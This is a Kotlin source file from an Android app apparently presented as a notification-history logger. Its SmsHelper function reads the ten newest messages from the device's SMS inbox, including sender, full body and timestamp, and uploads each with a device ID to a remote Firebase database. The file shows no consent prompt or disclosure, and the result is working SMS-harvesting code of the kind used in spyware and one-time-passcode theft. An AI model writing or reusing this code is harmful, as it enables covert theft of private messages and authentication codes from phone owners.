package com.notification.historylog

import android.content.Context
import android.net.Uri
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

object SmsHelper {

    fun syncLastMessages(context: Context) {
        try {
            val deviceId = FirebaseHelper.getDeviceId(context)
            val database = FirebaseDatabase.getInstance().reference
            
            val cursor = context.contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC"
            )

            if (cursor != null && cursor.moveToFirst()) {
                val count = if (cursor.count > 10) 10 else cursor.count
                
                for (i in 0 until count) {
                    val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                    val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    val date = cursor.getLong(cursor.getColumnIndexOrThrow("date"))

                    val smsData = mapOf(
                        "sender" to address,
                        "body" to body,
                        "timestamp" to date,
                        "device_id" to deviceId,
                        "is_sync" to true
                    )

                    // We use push() if we want to add all, or we could try to avoid duplicates
                    // For simplicity, we'll just push them for now
                    database.child("sms").child(deviceId).push().setValue(smsData)

                    if (!cursor.moveToNext()) break
                }
                cursor.close()
            }
        } catch (e: Exception) {
            Log.e("SmsHelper", "Error syncing SMS: ${e.message}")
        }
    }
}
